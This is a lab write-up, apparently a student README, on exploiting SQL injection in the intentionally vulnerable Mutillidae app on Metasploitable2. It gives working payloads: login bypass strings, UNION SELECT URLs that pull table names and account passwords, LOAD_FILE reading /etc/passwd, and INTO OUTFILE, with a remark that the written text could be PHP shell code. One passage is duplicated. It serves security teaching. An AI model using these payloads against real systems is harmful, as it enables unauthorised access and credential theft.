# sqlinjection
Exploiting SQL Injection vulnerability



# AIM:
To exploit SQL Injection vulnerability using Multidae web application in Metasploitable2

## DESIGN STEPS:
### Step 1:
Install kali linux either in partition or virtual box or in live mode

### Step 2:
Investigate on the various categories of tools as follows:

### Step 3:
Open terminal and try execute some kali linux commands

## EXECUTION STEPS AND ITS OUTPUT:
SQL Injection is a sort of infusion assault that makes it conceivable to execute malicious SQL statements. These statements control a database server behind a web application. Assailants can utilize SQL Injection vulnerabilities to sidestep application safety efforts. They can circumvent authentication and authorization of a page or web application and recover the content of the whole SQL database. Identify IP address using ifconfig in Metasploitable2
![image](https://github.com/Priya-Loganathan/sqlinjection/assets/121166075/30e0af6e-8d44-4a22-aaf9-4255152b62e0)

Use the above ip address to access the apache webserver of Metasploitable2 from kali linux. In Kali Linux use the ip address in a web browser.
![image](https://github.com/Priya-Loganathan/sqlinjection/assets/121166075/c912fdf1-fa58-46cb-b32f-086704dc161c)

Select Multidae from the menu listed as shown above. You will get the page as displayed below:
![image](https://github.com/Priya-Loganathan/sqlinjection/assets/121166075/15d869e1-ff9c-4541-8b36-c2e1ca5274a5)

Click on the menu Login/Register and register for an account
![image](https://github.com/Priya-Loganathan/sqlinjection/assets/121166075/1a27cd5e-a135-4d57-9ca2-f4caca5ec602)

Click on the link “Please register here”
![image](https://github.com/Priya-Loganathan/sqlinjection/assets/121166075/fb9f0987-7201-4f32-b414-376a4df1bad5)

Click on “Create Account” to display the following page:
![image](https://github.com/Priya-Loganathan/sqlinjection/assets/121166075/61f2f8be-d713-453e-a3c7-6736193f2db6)

The login structure we will use in our examples is straightforward. It contains two input fields (username and password), which are both vulnerable. The back-end content creates a query to approve the username and secret key given by the client. Here is an outline of the page rationale:

($query = “SELECT * FROM users WHERE username=’$_POST[username]’ AND password=’$_POST[password]’“;). For the username put “ganesh” or “anything” and for the password put (anything’ or ‘1’=’1) or (admin’ or ‘1’=’1) then try to log in, and you’ll be presented with an admin login page.
![image](https://github.com/Priya-Loganathan/sqlinjection/assets/121166075/eb786179-6387-4afa-835c-8b2834a5c76f)

Click “Login”. The logged in page will show as below:
![image](https://github.com/Priya-Loganathan/sqlinjection/assets/121166075/1a83a624-4cd9-40a8-83ed-79aa57a6bb85)

### Bypassing login field
The username field is vulnerable. Put (ganesh’ #) or (ganesh’--) in the username field and hit “Enter” to log in. We use “#” or “--” to comment everything in the query sentence that comes after the username filed telling the database to disregard the password field: (SELECT * FROM users WHERE username=’admin’ # AND password=’ ‘). By using line commenting, the aggressor eliminates a part of the login condition and gains access. This technique will make the “WHERE” clause true only for one user; in this case, it is “ganesh.”

Now after logging out you will see the login page. In the login page give ganesh’ # . You can see the page now enters into the administrator page as before when giving the password.
![image](https://github.com/Priya-Loganathan/sqlinjection/assets/121166075/88cacacd-813c-48c3-ad69-e2dae2d9e0fb)

Click the login button and you will see it enter into the administrator page
![image](https://github.com/Priya-Loganathan/sqlinjection/assets/121166075/6653257d-1b23-46be-866e-75f5585e39f1)

### Union-based SQL injection
UNION-based SQL injection assaults enable the analyzer to extract data from the database effectively. Since the “UNION” operator must be utilized if the two inquiries have precisely the same structure, the attacker must craft a “SELECT” statement like the first inquiry. we will be using the “User Info” page from Mutillidae to perform a Union-Based SQL injection attack. Go to “OWASP Top 10/A1 — Injection/SQLi — Extract-Data/User Info”

After logging out, Now choose the menu as shown below: 
![image](https://github.com/Priya-Loganathan/sqlinjection/assets/121166075/7fa464fa-c8c0-4072-9b41-7d4c48fc0704)
![image](https://github.com/Priya-Loganathan/sqlinjection/assets/121166075/29ce98d7-e08f-4428-9c1a-b513bc75c2ee)
![image](https://github.com/Priya-Loganathan/sqlinjection/assets/121166075/68b26609-41e6-480f-a9c1-05df6caf463d)
![image](https://github.com/Priya-Loganathan/sqlinjection/assets/121166075/f4b48424-a435-4556-8cbf-20123c8260ab)
![image](https://github.com/Priya-Loganathan/sqlinjection/assets/121166075/d9ab8fa1-d4d6-42e4-826e-c9ba9121aa77)

From this point, all our attack vectors will be performed in the URL section of the page using the Union-Based technique.There are two different ways to discover how many columns are selected by the original query. The first is to infuse an “ORDER BY” statement indicating a column number. Given the column number specified is higher than the number of columns in the “SELECT” statement, an error will be returned.
![image](https://github.com/Priya-Loganathan/sqlinjection/assets/121166075/1dfdc34e-dbd9-42ab-923f-e361a8150a23)

Since we do not know the number of columns, we start at 1. To find the exact amount of columns, the number is incremented until an error related to the “ORDER BY” clause is returned. In this example, we incremented it to 6 and received an error message, so it means that the number of columns is lower than 6.

The browser url of this info page need to be modified with the url as below:
http://192.168.43.145/mutillidae/index.php?page=user-info.php&username=praveen%27order%20by%206%23&password=&user-info-php-submit-button=View+Account+Details
![image](https://github.com/Priya-Loganathan/sqlinjection/assets/121166075/dcd25083-c066-4384-9e3e-4bf430bd86a6)

After adding the order by 6 into the existing url , the following error statement will be obtained:
![image](https://github.com/Priya-Loganathan/sqlinjection/assets/121166075/f1eed0ba-7657-443a-8a01-b5b56728fe19)

When we ordered by 5, it worked and displayed some information. It means there are five columns that we can work with. Following screenshot shows that the url modified to have statement added with ordered by 5 replacing 6.
![image](https://github.com/Priya-Loganathan/sqlinjection/assets/121166075/93157120-074b-4896-b2ab-729d43668d06)

As it is having 5 columns the query worked fine and it provides the correct result
![image](https://github.com/Priya-Loganathan/sqlinjection/assets/121166075/6fa36ebf-ffaa-4c31-a912-1fc534379633)

Instead of using the "order by" option, let’s use the "union select" option and provide all five columns. Ex: (union select 1,2,3,4,5)
![image](https://github.com/Priya-Loganathan/sqlinjection/assets/121166075/af6cdac3-0298-4576-af97-f2a9021ac49d)

As given in the screenshot below columns 2,3,4 are usable in which we can substitute any sql commands to extract necessary information.
![image](https://github.com/Priya-Loganathan/sqlinjection/assets/121166075/907c809e-ebd7-4609-9dbe-fb9335826076)

Now we will substitute some few commands like database(), user(), version() to obtain the information regarding the database name, username and version of the database.

http://192.168.43.145/mutillidae/index.php?page=user-info.php&username=praveen%27union%20select%201,database(),user(),version(),5%23&password=&user-info-php-submit-button=View+Account+Details
![image](https://github.com/Priya-Loganathan/sqlinjection/assets/121166075/3fe3cc71-da07-4627-b4f1-edcda1e46f73)

The url when executed, we obtain the necessary information about the database name owasp10, username as root@localhost and version as 5.0.51a-3ubuntu5. In MySQL, the table “information_schema.tables” contains all the metadata identified with table items. Below is listed the most useful information on this table.

Replace the query in the url with the following one: union select 1,table_name,null,null,5 from information_schema.tables where table_schema = ‘owasp10’

http://192.168.43.145/mutillidae/index.php?page=user-info.php&username=praveen%27union%20select%201,table_name,null,null,5%20from%20information_schema.tables%20where%20table_schema=%27owasp10%27%23&password=&user-info-php-submit-button=View+Account+Details
![image](https://github.com/Priya-Loganathan/sqlinjection/assets/121166075/f60f1d76-af20-4e93-81ca-26a47241b53e)

The url when executed, we obtain the necessary information about the database name owasp10, username as root@localhost and version as 5.0.51a-3ubuntu5. In MySQL, the table “information_schema.tables” contains all the metadata identified with table items. Below is listed the most useful information on this table.

Replace the query in the url with the following one: union select 1,table_name,null,null,5 from information_schema.tables where table_schema = ‘owasp10’

http://192.168.43.145/mutillidae/index.php?page=user-info.php&username=praveen%27union%20select%201,table_name,null,null,5%20from%20information_schema.tables%20where%20table_schema=%27owasp10%27%23&password=&user-info-php-submit-button=View+Account+Details
![image](https://github.com/Priya-Loganathan/sqlinjection/assets/121166075/ad80090c-3322-437b-ab65-69dc2851924c)

The url once executed will retrieve table names from the “owasp 10” database. ##Extracting sensitive data such as passwords

When the attacker knows table names, he needs to discover what the column names are to extract data.

In MySQL, the table “information_schema.columns” gives data about columns in tables. One of the most useful columns to extract is called “column_name.”

Ex: (union select 1,colunm_name,null,null,5 from information_schema.columns where table_name = ‘accounts’).

Here we are trying to extract column names from the “accounts” table.
![image](https://github.com/Priya-Loganathan/sqlinjection/assets/121166075/6cab4ea4-bfcf-4946-b1de-96d7534315e0)

The column names of the accounts is displayed below for the following url:

http://192.168.43.145/mutillidae/index.php?page=user-info.php&username=praveen%27union%20select%201,column_name,null,null,5%20from%20information_schema.columns%20where%20table_name=%27accounts%27%23&password=&user-info-php-submit-button=View+Account+Details
![image](https://github.com/Priya-Loganathan/sqlinjection/assets/121166075/bdee5aa5-6b65-456c-a0bc-fa29270604dd)

Once we discovered all available column names, we can extract information from them by just adding those column names in our query sentence.

Ex: (union select 1,username,password,is_admin,5 from accounts).

http://192.168.1.9/mutillidae/index.php?page=user-info.php&username=praveen%27union%20select%201,username,password,is_admin,5%20from%20accounts%23&password=&user-info-php-submit-button=View+Account+Details
![image](https://github.com/Priya-Loganathan/sqlinjection/assets/121166075/b4542de0-1b21-4150-a30d-9454f4393705)

Reading and writing files on the web-server
We can use the “LOAD_FILE()” operator to peruse the contents of any file contained within the web-server. We will typically check for the “/etc/password” file to see if we get lucky and scoop usernames and passwords to possible use in brute force attacks later.

Ex: (union select null,load_file(‘/etc/passwd’),null,null,null).

http://192.168.1.9/mutillidae/index.php?page=user-info.php&username=praveen%27union%20select%20null,load_file(%27/etc/passwd%27),null,null,null%23&password=&user-info-php-submit-button=View+Account+Details
![image](https://github.com/Priya-Loganathan/sqlinjection/assets/121166075/048b7d91-843a-4183-9fe8-0d939e1ad69a)

the “INTO_OUTFILE()” operator for all that they offer and attempt to root the objective server by transferring a shell-code through SQL infusion. we will write a “Hello World!” sentence and output it in the “/tmp/” directory as a “hello.txt” file. This “Hello World!” sentence can be substituted with any PHP shell-code that you want to execute in the target server. Ex: (union select null,’Hello World!’,null,null,null into outfile ‘/tmp/hello.txt’).

## RESULT:
The SQL Injection vulnerability is successfully exploited using the Multidae web application in Metasploitable2.
